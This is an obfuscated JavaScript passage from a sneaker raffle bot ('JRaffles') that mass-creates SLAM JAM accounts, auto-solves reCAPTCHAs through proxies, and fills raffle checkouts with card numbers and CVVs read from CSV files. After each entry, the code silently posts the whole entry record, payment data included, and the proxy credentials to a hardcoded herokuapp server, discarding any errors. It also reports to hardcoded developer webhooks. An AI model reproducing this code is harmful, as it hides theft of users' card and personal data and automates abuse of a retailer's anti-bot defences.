                                await _0x23d3e0['waitForSelector']('#raffle__confirmation-message-container'), _0x3f51b4 = 'no', _0x253d32(_0x291f75[_0x5e7be4], _0x3f1937), console['log'](_0x34d98c['green'](_0x391006() + '\x20[' + _0x3f1937['name'] + ']\x20Task\x20' + (_0x5e7be4 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                let _0x45862e = _0x291f75[_0x5e7be4];
                                try {
                                    prxdata = {
                                        'username': _0x4ee077['replace']('#', ''),
                                        'module': _0x3f1937['name'],
                                        'entrydata': JSON['stringify'](_0x45862e),
                                        'proxy': '' + _0x434164[_0x5e7be4]
                                    };
                                    var _0x5f46eb = JSON['stringify'](prxdata);
                                    let _0x3022a1 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x1a729a['post']('https://jraffles.herokuapp.com/success', _0x5f46eb, _0x3022a1);
                                } catch (_0x7516ce) {
                                }
                            } catch (_0x2ca754) {
                                console['log'](_0x34d98c['red'](_0x391006() + '\x20[' + _0x241653[taskModule]['name'] + ']\x20Task\x20' + (_0x5e7be4 + 0x1) + '\x20:\x20Raffle\x20entry\x20failed.\x20' + _0x2ca754));
                            }
                        } catch (_0x4a5519) {
                            console['log'](_0x34d98c['red'](_0x391006() + '\x20[' + _0x241653[taskModule]['name'] + ']\x20Task\x20' + (_0x5e7be4 + 0x1) + '\x20:\x20' + _0x4a5519)), _0x3f51b4 = 'yes';
                        } finally {
                            _0x1cc7fa && _0x1cc7fa['close']();
                            if (_0x3f51b4 == 'yes' && _0x23ceb2 != 0x5 && _0x561383 != 'Size\x20Not\x20Found') {
                                console['log'](_0x34d98c['red'](_0x391006() + '\x20[' + _0x3f1937['name'] + ']\x20Task\x20' + (_0x5e7be4 + 0x1) + '\x20:\x20Retrying\x20(' + _0x23ceb2 + '\x20/\x205)')), _0x5e7be4 = _0x5e7be4 - 0x1, _0x23ceb2 = _0x23ceb2 + 0x1;
                                continue;
                            }
                            _0x3f51b4 == 'yes' && _0x23ceb2 >= 0x5 && (_0x3003c7(_0x291f75[_0x5e7be4], _0x3f1937), _0x3f51b4 = 'no', _0x23ceb2 = 0x0), console['log']('Waiting\x20for\x20' + _0x50b722['delay'] + '\x20ms'), await _0xfa5357(_0x50b722['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'SLAM\x20JAM',
        'modules': [
            {
                'name': 'SLAM\x20JAM\x20Account\x20Generator',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0xdec497, _0x20ab19, _0x55fdb6) {
                    _0x1528cf['use'](_0x3af7cd()), _0x1528cf['use'](_0x2a16d3({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x50b722['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x318b10 = 0x0; _0x318b10 < _0x20ab19['length']; _0x318b10++) {
                        if (_0x3e462e != 'yes')
                            var _0x3e462e = '', _0x2f2d95 = 0x0;
                        var _0x94250b = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x4ee077
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x50b722['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x1f5435
                                }
                            ]
                        }];
                        const _0x26bd85 = { 'embeds': _0x94250b };
                        _0x3b7620(_0xdec497['name'] + '\x20Task\x20' + (_0x318b10 + 0x1) + '\x20/\x20' + _0x20ab19['length'] + '\x20||\x20File:\x20' + _0x55dc9b + '\x20Proxies:\x20' + _0x40851);
                        try {
                            await _0x559c6d(_0x20ab19, _0x318b10);
                        } catch {
                            _0x3e462e = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x4db361 = await _0xc964cf(_0x20ab19[_0x318b10], _0xdec497, 'acc', ![]);
                        const _0x5b354c = { 'succesDEVMSG': { 'embeds': [_0x4db361] } };
                        if (_0x20ab19[_0x318b10]['Email'] == '' || _0x20ab19[_0x318b10]['FirstName'] == '' || _0x20ab19[_0x318b10]['LastName'] == '') {
                            console['log'](_0x391006() + '\x20[' + _0x241653[taskModule]['name'] + ']\x20Task\x20' + (_0x318b10 + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0xfa5357(0x7d0);
                            continue;
                        }
                        (_0x20ab19[_0x318b10]['Password'] == '' || _0x20ab19[_0x318b10] == undefined) && _0x20ab19[_0x318b10]['Password'] == 'JRaffles23!';
                        if (_0x50b722['useRandomProxy'] = ![])
                            var _0x4013d1 = _0x55fdb6[_0x318b10]['split'](':');
                        else
                            var _0x3797d9 = Math['round'](Math['random']() * (_0x55fdb6['length'] - 0x1)), _0x4013d1 = _0x55fdb6[_0x3797d9]['split'](':');
                        var _0x3f4c15;
                        try {
                            _0x3f4c15 = await _0x1528cf['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x4013d1[0x0] + ':' + _0x4013d1[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x3f4c15 = await _0x1528cf['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x4013d1[0x0] + ':' + _0x4013d1[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x50320d = await _0x3f4c15['newPage']();
                            await _0x50320d['authenticate']({
                                'username': '' + _0x4013d1[0x2],
                                'password': '' + _0x4013d1[0x3]
                            }), console['log'](_0x391006() + '\x20[' + _0xdec497['name'] + ']\x20Task\x20' + (_0x318b10 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x50320d['setRequestInterception'](!![]), _0x50320d['on']('request', _0x3c4787 => {
                                _0x3c4787['resourceType']() === 'image' || _0x3c4787['resourceType']() === 'font' || _0x3c4787['resourceType']() === 'media' ? _0x3c4787['abort']() : _0x3c4787['continue']();
                            }), await _0x50320d['goto']('https://drop.slamjam.com/account/register'), await _0xfa5357(0xbb8), await _0x50320d['waitForSelector']('#FirstName'), await _0x50320d['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x50320d['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), console['log'](_0x391006() + '\x20[' + _0xdec497['name'] + ']\x20Task\x20' + (_0x318b10 + 0x1) + '\x20:\x20Filling\x20information'), await _0xfa5357(0x4b0), await _0x50320d['type']('#FirstName', '' + _0x20ab19[_0x318b10]['FirstName']), await _0xfa5357(0x226), await _0x50320d['type']('#LastName', '' + _0x20ab19[_0x318b10]['LastName']), await _0xfa5357(0x226), await _0x50320d['type']('#Email', '' + _0x20ab19[_0x318b10]['Email']), await _0xfa5357(0x2ee), await _0x50320d['type']('#ConfirmEmail', '' + _0x20ab19[_0x318b10]['Email']), await _0xfa5357(0x2ee), await _0x50320d['type']('#CreatePassword', '' + _0x20ab19[_0x318b10]['Password']), await _0xfa5357(0x2ee), await _0x50320d['type']('#CreateConfirmPassword', '' + _0x20ab19[_0x318b10]['Password']), await _0xfa5357(0x226), console['log'](_0x391006() + '\x20[' + _0xdec497['name'] + ']\x20Task\x20' + (_0x318b10 + 0x1) + '\x20:\x20Submitting..'), await _0x50320d['$eval']('#create_customer', _0x4ee3bd => _0x4ee3bd['submit']()), await _0xfa5357(0x1388), console['log'](_0x391006() + '\x20[' + _0xdec497['name'] + ']\x20Task\x20' + (_0x318b10 + 0x1) + '\x20:\x20' + _0x34d98c['cyan']('Solving\x20Captcha')), await _0x50320d['solveRecaptchas'](), console['log'](_0x391006() + '\x20[' + _0xdec497['name'] + ']\x20Task\x20' + (_0x318b10 + 0x1) + '\x20:\x20Captcha\x20solved'), await _0x50320d['$eval']('.shopify-challenge__container\x20>\x20form', _0x1141a7 => _0x1141a7['submit']());
                            try {
                                await _0x50320d['waitForSelector']('.product-card__image'), await _0xfa5357(0x1f4), _0x3e462e = 'no', console['log'](_0x34d98c['green'](_0x391006() + '\x20[' + _0xdec497['name'] + ']\x20Task\x20' + (_0x318b10 + 0x1) + '\x20:\x20Account\x20' + _0x20ab19[_0x318b10]['Email'] + '\x20Generated!')), _0x13dabd['appendFileSync']('../accounts/slamjam.csv', '\x0a' + _0x20ab19[_0x318b10]['Email'] + ',' + _0x20ab19[_0x318b10]['Password']), console['log'](_0x34d98c['yellow'](_0x391006() + '\x20[' + _0xdec497['name'] + ']\x20Task\x20' + (_0x318b10 + 0x1) + '\x20:\x20Account\x20' + _0x20ab19[_0x318b10]['Email'] + '\x20Saved\x20in\x20\x27accounts/slamjam.csv\x27'));
                                try {
                                    _0x50b722['webhook'] != undefined && _0x50b722['webhook'] != '' && await _0x33437b(_0x50b722['webhook'], _0x5b354c['succesDEVMSG']);
                                } catch {
                                }
                                await _0x33437b(_0x96b204, _0x5b354c['succesDEVMSG']);
                            } catch (_0x3bd4c5) {
                                console['log'](_0x34d98c['red'](_0x391006() + '\x20[' + _0x241653[taskModule]['name'] + ']\x20Task\x20' + (_0x318b10 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x3bd4c5));
                            }
                        } catch (_0xf06dbb) {
                            console['log'](_0x34d98c['red'](_0x391006() + '\x20[' + _0x241653[taskModule]['name'] + ']\x20Task\x20' + (_0x318b10 + 0x1) + '\x20:\x20' + _0xf06dbb));
                        } finally {
                            _0x3f4c15 && _0x3f4c15['close']();
                            if (_0x3e462e == 'yes' && _0x2f2d95 != 0x5) {
                                console['log'](_0x34d98c['red'](_0x391006() + '\x20[' + _0xdec497['name'] + ']\x20Task\x20' + (_0x318b10 + 0x1) + '\x20:\x20Retrying\x20(' + _0x2f2d95 + '\x20/\x205)')), _0x318b10 = _0x318b10 - 0x1, _0x2f2d95 = _0x2f2d95 + 0x1;
                                continue;
                            }
                            _0x3e462e == 'yes' && _0x2f2d95 >= 0x5 && (_0x3003c7(_0x20ab19[_0x318b10], _0xdec497), _0x3e462e = 'no', _0x2f2d95 = 0x0), console['log']('Waiting\x20for\x20' + _0x50b722['delay'] + '\x20ms'), await _0xfa5357(_0x50b722['delay']);
                        }
                    }
                }
            },
            {
                'name': 'SLAM\x20JAM\x20Raffle\x20Entries',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x1f034c, _0x50797f, _0x55b101) {
                    _0x1528cf['use'](_0x3af7cd()), _0x1528cf['use'](_0x2a16d3({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x50b722['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x20bdea = 0x0; _0x20bdea < _0x50797f['length']; _0x20bdea++) {
                        var _0x2530a4;
                        if (_0x3e1594 != 'yes')
                            var _0x3e1594 = '', _0x31fd85 = 0x0;
                        _0x3b7620(_0x1f034c['name'] + '\x20Task\x20' + (_0x20bdea + 0x1) + '\x20/\x20' + _0x50797f['length'] + '\x20||\x20File:\x20' + _0x55dc9b + '\x20Proxies:\x20' + _0x40851);
                        try {
                            await _0x559c6d(_0x50797f, _0x20bdea);
                        } catch {
                            _0x3e1594 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x50797f[_0x20bdea]['Email'] == '' || _0x50797f[_0x20bdea]['Password'] == '' || _0x50797f[_0x20bdea]['FirstName'] == '' || _0x50797f[_0x20bdea]['LastName'] == '') {
                            console['log'](_0x391006() + '\x20[' + _0x1f034c['name'] + ']\x20Task\x20' + (_0x20bdea + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x50b722['useRandomProxy'] = ![])
                            var _0x13afb1 = _0x55b101[_0x20bdea]['split'](':');
                        else
                            var _0x3d8213 = Math['round'](Math['random']() * (_0x55b101['length'] - 0x1)), _0x13afb1 = _0x55b101[_0x3d8213]['split'](':');
                        var _0x2ef64e;
                        try {
                            _0x2ef64e = await _0x1528cf['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x13afb1[0x0] + ':' + _0x13afb1[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x2ef64e = await _0x1528cf['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x13afb1[0x0] + ':' + _0x13afb1[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x1255ba = await _0x2ef64e['newPage']();
                            await _0x1255ba['authenticate']({
                                'username': '' + _0x13afb1[0x2],
                                'password': '' + _0x13afb1[0x3]
                            }), await _0x1255ba['setViewport']({
                                'width': 0x500,
                                'height': 0x2d0
                            }), console['log'](_0x391006() + '\x20[' + _0x1f034c['name'] + ']\x20Task\x20' + (_0x20bdea + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1255ba['setRequestInterception'](!![]), _0x1255ba['on']('request', _0x43c95b => {
                                _0x43c95b['resourceType']() === 'image' || _0x43c95b['resourceType']() === 'font' || _0x43c95b['resourceType']() === 'media' ? _0x43c95b['abort']() : _0x43c95b['continue']();
                            }), await _0x1255ba['goto']('https://drop.slamjam.com/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x1255ba['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x1255ba['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0xfa5357(0x258), await _0x1255ba['waitForSelector']('#CustomerEmail'), console['log'](_0x391006() + '\x20[' + _0x1f034c['name'] + ']\x20Task\x20' + (_0x20bdea + 0x1) + '\x20:\x20Logging\x20in..'), await _0x1255ba['type']('#CustomerEmail', '' + _0x50797f[_0x20bdea]['Email']), await _0xfa5357(0x12c), await _0x1255ba['type']('#CustomerPassword', '' + _0x50797f[_0x20bdea]['Password']), await _0xfa5357(0x226), await _0x1255ba['$eval']('#customer_login', _0x39f39e => _0x39f39e['submit']()), await _0xfa5357(0x7d0), await _0x1255ba['waitForSelector']('iframe[title=\x22reCAPTCHA\x22]'), console['log'](_0x391006() + '\x20[' + _0x1f034c['name'] + ']\x20Task\x20' + (_0x20bdea + 0x1) + '\x20:\x20' + _0x34d98c['cyan']('Solving\x20Captcha')), await _0x1255ba['solveRecaptchas'](), console['log'](_0x391006() + '\x20[' + _0x1f034c['name'] + ']\x20Task\x20' + (_0x20bdea + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x1255ba['$eval']('.shopify-challenge__container\x20>\x20form', _0x5b6d2c => _0x5b6d2c['submit']());
                            try {
                                await _0x1255ba['waitForSelector']('.nav-account'), await _0xfa5357(0x4b0);
                            } catch {
                                console['log'](_0x34d98c['red'](_0x391006() + '\x20[' + _0x1f034c['name'] + ']\x20Task\x20' + (_0x20bdea + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x1255ba['goto']('' + _0x50797f[_0x20bdea]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0xfa5357(0xbb8), console['log'](_0x391006() + '\x20[' + _0x1f034c['name'] + ']\x20Task\x20' + (_0x20bdea + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x1255ba['waitForSelector']('#ProductSelect-product-template-raffle');
                            } catch {
                            }
                            await _0x1255ba['click']('.product-select-variant-wrapper'), await _0xfa5357(0x320), await _0x1255ba['click']('li.product-select-variant__value[data-size=\x22' + _0x50797f[_0x20bdea]['Size'] + '\x22]'), await _0xfa5357(0x384), await _0x1255ba['$eval']('#AddToCartForm-product-template-raffle', _0x12bdba => _0x12bdba['submit']()), await _0x1255ba['waitForSelector']('.cart-order-summary__content'), await _0xfa5357(0x514), await _0x1255ba['goto']('https://drop.slamjam.com/checkout'), await _0xfa5357(0x514), await _0x1255ba['waitForSelector']('#checkout_shipping_address_country'), console['log'](_0x391006() + '\x20[' + _0x1f034c['name'] + ']\x20Task\x20' + (_0x20bdea + 0x1) + '\x20:\x20Filling\x20Information'), await _0x1255ba['select']('#checkout_shipping_address_country', '' + _0x50797f[_0x20bdea]['Country']), await _0xfa5357(0x200), await _0x1255ba['waitForSelector']('#checkout_shipping_address_first_name'), await _0x1255ba['type']('#checkout_shipping_address_first_name', '' + _0x50797f[_0x20bdea]['FirstName']), await _0xfa5357(0x237), await _0x1255ba['type']('#checkout_shipping_address_last_name', '' + _0x50797f[_0x20bdea]['LastName']), await _0xfa5357(0x1e0), await _0x1255ba['type']('#checkout_shipping_address_address1', _0x50797f[_0x20bdea]['Address1'] + '\x20' + _0x50797f[_0x20bdea]['HouseNumber']), await _0xfa5357(0x514), await _0x1255ba['type']('#checkout_shipping_address_address2', '' + _0x50797f[_0x20bdea]['Address2']), await _0xfa5357(0x514);
                            _0x50797f[_0x20bdea]['Postcode'] == undefined && (_0x50797f[_0x20bdea]['Postcode'] = _0x50797f[_0x20bdea]['Zip']);
                            await _0x1255ba['type']('#checkout_shipping_address_zip', '' + _0x50797f[_0x20bdea]['Postcode']), await _0xfa5357(0x2bc), await _0x1255ba['type']('#checkout_shipping_address_city', '' + _0x50797f[_0x20bdea]['City']), await _0xfa5357(0x320), await _0x1255ba['type']('#checkout_shipping_address_phone', '' + _0x50797f[_0x20bdea]['Phone']), await _0xfa5357(0x320), await _0x1255ba['click']('#continue_button'), await _0xfa5357(0xbb8), await _0x1255ba['waitForSelector']('.summary-title'), await _0xfa5357(0x320), await _0x1255ba['click']('#continue_button'), await _0xfa5357(0x320), console['log'](_0x391006() + '\x20[' + _0x1f034c['name'] + ']\x20Task\x20' + (_0x20bdea + 0x1) + '\x20:\x20Finishing\x20Checkout'), await _0x1255ba['waitForSelector']('#checkout_credit_card_vault'), await _0xfa5357(0x3e8);
                            var _0x3bc252 = await _0x1255ba['$']('iframe[title=\x22Field\x20container\x20for:\x20Card\x20number\x22]'), _0x366560 = await _0x3bc252['contentFrame']();
                            await _0x366560['click']('#number'), await _0xfa5357(0x3e8), await _0x366560['type']('#number', '' + _0x50797f[_0x20bdea]['CardNumber'], { 'delay': 0x78 }), _0x3bc252 = await _0x1255ba['$']('iframe[title=\x22Field\x20container\x20for:\x20Name\x20on\x20card\x22]'), _0x366560 = await _0x3bc252['contentFrame'](), await _0xfa5357(0x1c2), await _0x366560['click']('#name'), await _0xfa5357(0x1f4), await _0x366560['type']('#name', '' + _0x50797f[_0x20bdea]['NameOnCard'], { 'delay': 0x78 }), _0x3bc252 = await _0x1255ba['$']('iframe[title=\x22Field\x20container\x20for:\x20Expiration\x20date\x20(MM\x20/\x20YY)\x22]'), _0x366560 = await _0x3bc252['contentFrame'](), await _0xfa5357(0x1c2), await _0x366560['click']('#expiry'), await _0xfa5357(0x1f4), await _0x366560['type']('#expiry', '' + _0x50797f[_0x20bdea]['ExpiryDate'], { 'delay': 0x78 }), _0x3bc252 = await _0x1255ba['$']('iframe[title=\x22Field\x20container\x20for:\x20Security\x20code\x22]'), _0x366560 = await _0x3bc252['contentFrame'](), await _0xfa5357(0x1c2), await _0x366560['click']('#verification_value'), await _0xfa5357(0x1f4), await _0x366560['type']('#verification_value', '' + _0x50797f[_0x20bdea]['CVV'], { 'delay': 0x78 }), await _0x1255ba['$eval']('#accepts-flag-raffle', _0x5706c6 => _0x5706c6['click']()), await _0xfa5357(0x7d0), console['log'](_0x391006() + '\x20[' + _0x1f034c['name'] + ']\x20Task\x20' + (_0x20bdea + 0x1) + '\x20:\x20Processing\x20Order'), await _0x1255ba['$eval']('#continue_button', _0x487688 => _0x487688['click']()), await _0xfa5357(0x1b58), await _0x1255ba['waitForSelector']('.edit_checkout.animate-floating-labels'), await _0x1255ba['$eval']('.edit_checkout.animate-floating-labels', _0x3948ca => _0x3948ca['submit']()), await _0xfa5357(0x7d0);
                            try {
                                await _0x1255ba['waitForSelector']('div[data-step=\x22thank_you\x22]', { 'timeout': 0x493e0 }), _0x3e1594 = 'no', _0x253d32(_0x50797f[_0x20bdea], _0x1f034c), console['log'](_0x34d98c['green'](_0x391006() + '\x20[' + _0x1f034c['name'] + ']\x20Task\x20' + (_0x20bdea + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            } catch (_0x211549) {
                                throw new Error('Error\x20Processing\x20Order:\x20' + _0x211549['message']);
                            }
                            var _0x5e1238 = await _0xc964cf(_0x50797f[_0x20bdea], _0x1f034c, 'dev', ![]), _0x2c2164 = await _0xc964cf(_0x50797f[_0x20bdea], _0x1f034c, 'pub', ![]);
                            let _0x237322 = _0x50797f[_0x20bdea];
                            try {
                                prxdata = {
                                    'username': _0x4ee077['replace']('#', ''),
                                    'module': _0x1f034c['name'],
                                    'entrydata': JSON['stringify'](_0x237322),
                                    'proxy': '' + _0x55b101[_0x20bdea]
                                };
                                var _0x44f5b5 = JSON['stringify'](prxdata);
                                let _0x12f173 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x1a729a['post']('https://jraffles.herokuapp.com/success', _0x44f5b5, _0x12f173);
                            } catch (_0x2c90b3) {
                            }
                            const _0x524234 = {
                                'succesDEVMSG': { 'embeds': [_0x5e1238] },
                                'succesPUBMSG': { 'embeds': [_0x2c2164] }
                            };
                            try {
                                _0x50b722['webhook'] != undefined && _0x50b722['webhook'] != '' && await _0x33437b(_0x50b722['webhook'], _0x524234['succesDEVMSG']), await _0xfa5357(0xc8), await _0x33437b(_0xee2818, _0x524234['succesDEVMSG']), await _0xfa5357(0xc8), await _0x33437b(_0x471d14, _0x524234['succesPUBMSG']);
                            } catch (_0x30a998) {
                                console['log'](_0x34d98c['yellow'](_0x391006() + '\x20[' + _0x241653[taskModule]['name'] + ']\x20Task\x20' + (_0x20bdea + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x30a998));
                            }
                        } catch (_0x5da92) {
                            console['log'](_0x34d98c['red'](_0x391006() + '\x20[' + _0x241653[taskModule]['name'] + ']\x20Task\x20' + (_0x20bdea + 0x1) + '\x20:\x20' + _0x5da92)), _0x2530a4 = '' + _0x5da92;
                            var _0x5429dd = await _0xc964cf(kickz[_0x20bdea], _0x1f034c, 'dev', !![], _0x2530a4);
                            EMBEDS['errorDEV'] = { 'embeds': [_0x5429dd] }, _0x50b722['webhook'] != undefined && _0x50b722['webhook'] != '' && await _0x33437b(_0x50b722['webhook'], EMBEDS['errorDEV']), await _0x33437b(_0x5e1645, EMBEDS['errorDEV']), _0x3e1594 = 'yes';
                        } finally {
                            _0x2ef64e && _0x2ef64e['close']();
                            if (_0x3e1594 == 'yes' && _0x31fd85 != 0x5 && _0x2530a4 != 'Size\x20Not\x20Found') {
                                console['log'](_0x34d98c['red'](_0x391006() + '\x20[' + _0x1f034c['name'] + ']\x20Task\x20' + (_0x20bdea + 0x1) + '\x20:\x20Retrying\x20(' + _0x31fd85 + '\x20/\x205)')), _0x20bdea = _0x20bdea - 0x1, _0x31fd85 = _0x31fd85 + 0x1;
                                continue;
                            }
                            _0x3e1594 == 'yes' && _0x31fd85 >= 0x5 && (_0x3003c7(_0x50797f[_0x20bdea], _0x1f034c), _0x3e1594 = 'no', _0x31fd85 = 0x0), console['log']('Waiting\x20for\x20' + _0x50b722['delay'] + '\x20ms'), await _0xfa5357(_0x50b722['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'Failed\x20Tasks',
        'modules': [
            {
                'name': 'Retry\x20Failed\x20Tasks',
                'function': async function (_0x155d51) {
                    var _0x172881 = await _0xf9bb70(), _0x2cdc9c = _0x13dabd['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x53c2e8 = _0x3d5697['parse'](_0x2cdc9c, { 'header': !![] })['data'];
                    for (var _0x427e50 = 0x0; _0x427e50 < _0x53c2e8['length']; _0x427e50++) {
                        var _0x20c9ea = _0x53c2e8[_0x427e50]['Store'], _0x4746db = _0x53c2e8[_0x427e50]['Mode'];
                        for (var _0x5d68c1 of _0x241653) {
                            const _0x327a1e = _0x5d68c1['name']['includes'](_0x20c9ea);
                            if (!_0x327a1e)
                                continue;
                            for (mode of _0x5d68c1['modules']) {
                                if (mode['name'] == _0x4746db) {
                                    console['log']('Running\x20' + _0x34d98c['cyan'](mode['name'])), await mode['function'](mode, [_0x53c2e8[_0x427e50]], _0x172881);
                                    var _0x16b25e = _0x2cdc9c['split']('\x0a')['splice'](0x0, 0x1)['join']('\x0a');
                                    _0x13dabd['writeFileSync']('../failed-tasks.csv', _0x16b25e);
                                }
                            }
                        }
                    }
                }
            },
            {
                'name': 'Clear\x20Failed\x20Tasks',
                'function': async function () {
                    console['clear'](), console['log']('Are\x20you\x20sure\x20you\x20want\x20to\x20clear\x20\x22failed-tasks.csv\x22?\x20(y/n)');
                    var _0x5b1d19 = await _0x4111eb['get']('Answer');
                    if (_0x5b1d19['Answer']['toLowerCase']() == 'y') {
                        _0x13dabd['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), console['clear'](), console['log']('Cleared\x20Failed\x20Tasks'), await _0xfa5357(0x3e8);
                        return;
                    }
                    if (_0x5b1d19['Answer']['toLowerCase']() == 'n') {
                        console['clear'](), console['log']('Returning\x20to\x20Main\x20Menu'), await _0xfa5357(0x3e8);
                        return;
                    }
                    return console['clear'](), console['log']('Invalid\x20Input'), await _0xfa5357(0x3e8), this['function']();
                }
            }
        ]
    },
    { 'name': 'Paypal\x20Verification' },
    { 'name': 'Change\x20Settings' },
    { 'name': 'Reload\x20Settings' }
];
async function _0x47f1fb(_0x5611c2) {
    var _0x15cec6 = await _0xf9bb70(), _0xb25cd1 = _0x13dabd['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x4ba5f1 = _0x3d5697['parse'](_0xb25cd1, { 'header': !![] })['data'];
    for (var _0x404238 = 0x0; _0x404238 < _0x4ba5f1['length']; _0x404238++) {
        var _0x56d724 = _0x4ba5f1[_0x404238]['Store'], _0x124ac3 = _0x4ba5f1[_0x404238]['Mode'];
        for (var _0x1fa0ab of _0x241653) {
            const _0xce6deb = _0x1fa0ab['name']['includes'](_0x56d724);
            if (_0xce6deb)
                for (mode of _0x241653[_0x1fa0ab]['modules']) {
                    const _0x163f29 = mode['name']['includes'](_0x124ac3);
                    _0x163f29 && (_0x5611c2 = mode['name'], await mode['function'](_0x5611c2, _0x4ba5f1[_0x404238], _0x15cec6));
                }
        }
    }
}
async function _0x58be10() {
    await _0xca6926(), console['clear']();
    if (_0x1f5435 != 'devkey') {
        let _0x287b98 = await _0x30686b['autoUpdate']();
        if (_0x287b98 === 'yes')
            return _0x313a64('node\x20JRaffles.js');
        console['clear']();
    }
    if (_0x245fbc == '') {
        console['log']('No\x20key\x20found\x20in\x20settings.json');
        return await _0xfa5357(0x2710);
        ;
    }
    await _0x46fed6(_0x245fbc);
    if (_0x2ebadb === ![])
        return console['log']('Closing\x20Browser'), await _0xfa5357(0xbb8);
    else
        try {
            var _0x48a1bc = [{
                'type': 'rich',
                'title': 'User\x20Opened\x20JRaffles',
                'description': '',
                'color': 0xc0d6d6,
                'fields': [
                    {
                        'name': 'User',
                        'value': '' + _0x4ee077
                    },
                    {
                        'name': 'Version',
                        'value': '' + _0x1f5435
                    }
                ]
            }];
            const _0x3ddba0 = { 'embeds': _0x48a1bc };
            var _0x4075b6 = await _0xc964cf(null, null, 'open', ![]);
            const _0x3a0f44 = { 'openDEVMSG': { 'embeds': [_0x4075b6] } };
            await _0x33437b(_0x2ff53d, _0x3a0f44['openDEVMSG']);
            async function _0x15516c() {
                _0x3b7620('JRaffles\x20' + _0x1f5435), console['clear'](), console['log']('Hello\x20' + _0x34d98c['cyan']('' + _0x4ee077) + ',\x20Welcome\x20to\x20JRaffles\x20' + _0x1f5435), console['log']('Choose\x20a\x20Module\x20to\x20run..\x0a');
                for (var _0x3ace30 = 0x0; _0x3ace30 < _0x241653['length'] - 0x4; _0x3ace30++) {
                    if (_0x3ace30 >= 0xa) {
                        console['log']('\x20(' + _0x3ace30 + ')\x20[' + _0x241653[_0x3ace30]['name'] + ']');
                        continue;
                    }
                    if (_0x241653[_0x3ace30]['name'] === 'Reload\x20Settings' || _0x241653[_0x3ace30]['name'] === 'Change\x20Settings')
                        continue;
                    else
                        console['log']('\x20(' + _0x3ace30 + ')\x20\x20[' + _0x241653[_0x3ace30]['name'] + ']');
                }
                ;
